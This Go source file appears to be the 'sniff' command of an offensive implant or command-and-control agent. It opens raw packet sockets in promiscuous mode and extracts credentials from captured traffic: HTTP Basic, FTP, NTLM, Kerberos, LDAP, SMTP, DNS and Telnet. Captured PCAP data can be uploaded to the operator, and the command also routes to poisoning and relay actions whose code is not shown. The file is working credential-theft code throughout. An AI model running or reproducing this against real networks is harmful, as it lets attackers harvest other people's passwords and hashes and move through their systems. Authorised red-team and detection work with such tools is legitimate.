//go:build linux

package commands

import (
	"encoding/binary"
	"encoding/json"
	"fmt"
	"net"
	"strings"
	"time"
	"unsafe"

	"fawkes/pkg/structs"

	"golang.org/x/sys/unix"
)

type SniffCommand struct{}

func (c *SniffCommand) Name() string { return "sniff" }
func (c *SniffCommand) Description() string {
	return "Passive network sniffing for credential capture (T1040)"
}

func sniffHtons(i uint16) uint16 {
	return (i<<8)&0xff00 | i>>8
}

func (c *SniffCommand) Execute(task structs.Task) structs.CommandResult {
	params, parseErr := requireParams[sniffParams](task)
	if parseErr != nil {
		return *parseErr
	}

	if params.Action == "poison" {
		return c.executePoison(task)
	}
	if params.Action == "relay" {
		return c.executeRelay(task)
	}

	if params.Duration <= 0 {
		params.Duration = 30
	}
	if params.Duration > 300 {
		params.Duration = 300
	}
	if params.MaxBytes <= 0 {
		params.MaxBytes = 50 * 1024 * 1024
	}

	var ports []uint16
	if params.Ports != "" {
		for _, p := range strings.Split(params.Ports, ",") {
			p = strings.TrimSpace(p)
			var port int
			if _, err := fmt.Sscanf(p, "%d", &port); err == nil && port > 0 && port < 65536 {
				ports = append(ports, uint16(port))
			}
		}
	}
	if len(ports) == 0 {
		ports = []uint16{21, 53, 80, 88, 110, 143, 389, 445, 8080}
	}

	fd, err := unix.Socket(unix.AF_PACKET, unix.SOCK_RAW, int(sniffHtons(unix.ETH_P_IP)))
	if err != nil {
		return errorf("Failed to create raw socket (need root/CAP_NET_RAW): %v", err)
	}
	defer unix.Close(fd)

	result := &sniffResult{}

	if params.Interface != "" {
		iface, ifErr := net.InterfaceByName(params.Interface)
		if ifErr != nil {
			return errorf("Interface %q not found: %v", params.Interface, ifErr)
		}

		sll := unix.SockaddrLinklayer{
			Protocol: sniffHtons(unix.ETH_P_IP),
			Ifindex:  iface.Index,
		}
		if bindErr := unix.Bind(fd, &sll); bindErr != nil {
			return errorf("Bind to %q failed: %v", params.Interface, bindErr)
		}

		if params.Promiscuous {
			mreq := unix.PacketMreq{
				Ifindex: int32(iface.Index),
				Type:    unix.PACKET_MR_PROMISC,
			}
			if promErr := unix.SetsockoptPacketMreq(fd, unix.SOL_PACKET, unix.PACKET_ADD_MEMBERSHIP, &mreq); promErr != nil {
				result.Errors = append(result.Errors, fmt.Sprintf("promiscuous mode failed: %v", promErr))
			} else {
				defer func() {
					_ = unix.SetsockoptPacketMreq(fd, unix.SOL_PACKET, unix.PACKET_DROP_MEMBERSHIP, &unix.PacketMreq{
						Ifindex: int32(iface.Index),
						Type:    unix.PACKET_MR_PROMISC,
					})
				}()
			}
		}
	}

	bpfFilter := sniffBuildTCPFilter(ports)
	if bpfErr := sniffAttachBPF(fd, bpfFilter); bpfErr != nil {
		result.Errors = append(result.Errors, fmt.Sprintf("BPF filter failed: %v", bpfErr))
	}

	tv := unix.Timeval{Sec: 1, Usec: 0}
	_ = unix.SetsockoptTimeval(fd, unix.SOL_SOCKET, unix.SO_RCVTIMEO, &tv)

	ftpTracker := &sniffFTPTracker{pending: make(map[string]string)}
	telnetTracker := &sniffTelnetTracker{pending: make(map[string]string)}
	var pcapCollector *sniffPCAPCollector
	if params.SavePCAP {
		pcapCollector = newSniffPCAPCollector(params.MaxBytes)
	}
	deadline := time.Now().Add(time.Duration(params.Duration) * time.Second)
	startTime := time.Now()
	buf := make([]byte, 65536)

	for !task.DidStop() && time.Now().Before(deadline) && result.BytesCaptured < params.MaxBytes {
		n, _, recvErr := unix.Recvfrom(fd, buf, 0)
		if recvErr != nil {
			if recvErr == unix.EAGAIN || recvErr == unix.EWOULDBLOCK || recvErr == unix.EINTR {
				continue
			}
			result.Errors = append(result.Errors, fmt.Sprintf("recvfrom: %v", recvErr))
			break
		}
		if n == 0 {
			continue
		}

		result.PacketCount++
		result.BytesCaptured += int64(n)
		packet := buf[:n]

		if pcapCollector != nil {
			pcapCollector.addPacket(packet)
		}

		if len(packet) < 14 {
			continue
		}
		etherType := binary.BigEndian.Uint16(packet[12:14])
		if etherType != 0x0800 {
			continue
		}
		ipData := packet[14:]

		if len(ipData) < 20 {
			continue
		}
		ihl := int(ipData[0]&0x0F) * 4
		proto := ipData[9]
		if ihl < 20 || ihl > len(ipData) || (proto != 6 && proto != 17) {
			continue
		}
		totalLen := int(binary.BigEndian.Uint16(ipData[2:4]))
		if totalLen > len(ipData) {
			totalLen = len(ipData)
		}

		meta := packetMeta{
			SrcIP: net.IP(ipData[12:16]).String(),
			DstIP: net.IP(ipData[16:20]).String(),
		}
		transportData := ipData[ihl:totalLen]

		var payload []byte
		if proto == 6 { // TCP
			if len(transportData) < 20 {
				continue
			}
			meta.SrcPort = binary.BigEndian.Uint16(transportData[0:2])
			meta.DstPort = binary.BigEndian.Uint16(transportData[2:4])
			dataOff := int(transportData[12]>>4) * 4
			if dataOff < 20 || dataOff > len(transportData) {
				continue
			}
			payload = transportData[dataOff:]
		} else { // UDP
			if len(transportData) < 8 {
				continue
			}
			meta.SrcPort = binary.BigEndian.Uint16(transportData[0:2])
			meta.DstPort = binary.BigEndian.Uint16(transportData[2:4])
			payload = transportData[8:]
		}
		if len(payload) == 0 {
			continue
		}

		if cred := sniffExtractHTTPBasicAuth(payload, &meta); cred != nil {
			result.Credentials = append(result.Credentials, cred)
		}
		if meta.DstPort == 21 || meta.SrcPort == 21 {
			if cred := ftpTracker.process(payload, &meta); cred != nil {
				result.Credentials = append(result.Credentials, cred)
			}
		}
		if cred := sniffExtractNTLM(payload, &meta); cred != nil {
			result.Credentials = append(result.Credentials, cred)
		}
		if cred := sniffExtractKerberos(payload, &meta); cred != nil {
			result.Credentials = append(result.Credentials, cred)
		}
		if cred := sniffExtractDNS(payload, &meta); cred != nil {
			result.Credentials = append(result.Credentials, cred)
		}
		if cred := sniffExtractLDAP(payload, &meta); cred != nil {
			result.Credentials = append(result.Credentials, cred)
		}
		if cred := sniffExtractSMTPAuth(payload, &meta); cred != nil {
			result.Credentials = append(result.Credentials, cred)
		}
		if cred := telnetTracker.process(payload, &meta); cred != nil {
			result.Credentials = append(result.Credentials, cred)
		}
	}

	result.Duration = time.Since(startTime).Truncate(time.Second).String()

	// Upload PCAP if requested (link type 1 = LINKTYPE_ETHERNET)
	if pcapCollector != nil && len(pcapCollector.packets) > 0 {
		pcapData := pcapCollector.buildPCAP(1)
		sniffUploadPCAP(&task, pcapData, result)
	}

	output, _ := json.Marshal(result)
	return successResult(string(output))
}

func sniffBuildTCPFilter(ports []uint16) []unix.SockFilter {
	// Accept IPv4 TCP (proto 6) or UDP (proto 17) packets.
	// Port filtering is done in userspace since BPF port offsets differ for TCP vs UDP.
	return []unix.SockFilter{
		{Code: 0x28, K: 12},                   // ldh [12] — EtherType
		{Code: 0x15, Jt: 0, Jf: 4, K: 0x0800}, // jeq #0x0800, next, drop
		{Code: 0x30, K: 23},                   // ldb [23] — IP protocol
		{Code: 0x15, Jt: 1, Jf: 0, K: 6},      // jeq #6 (TCP), accept
		{Code: 0x15, Jt: 0, Jf: 1, K: 17},     // jeq #17 (UDP), accept, drop
		{Code: 0x06, K: 0xFFFFFFFF},           // ret #-1 (accept)
		{Code: 0x06, K: 0},                    // ret #0 (drop)
	}
}

func sniffAttachBPF(fd int, filter []unix.SockFilter) error {
	prog := unix.SockFprog{
		Len:    uint16(len(filter)),
		Filter: &filter[0],
	}
	_, _, errno := unix.Syscall6(
		unix.SYS_SETSOCKOPT,
		uintptr(fd),
		uintptr(unix.SOL_SOCKET),
		uintptr(unix.SO_ATTACH_FILTER),
		uintptr(unsafe.Pointer(&prog)),
		uintptr(unsafe.Sizeof(prog)),
		0,
	)
	if errno != 0 {
		return fmt.Errorf("SO_ATTACH_FILTER: %v", errno)
	}
	return nil
}
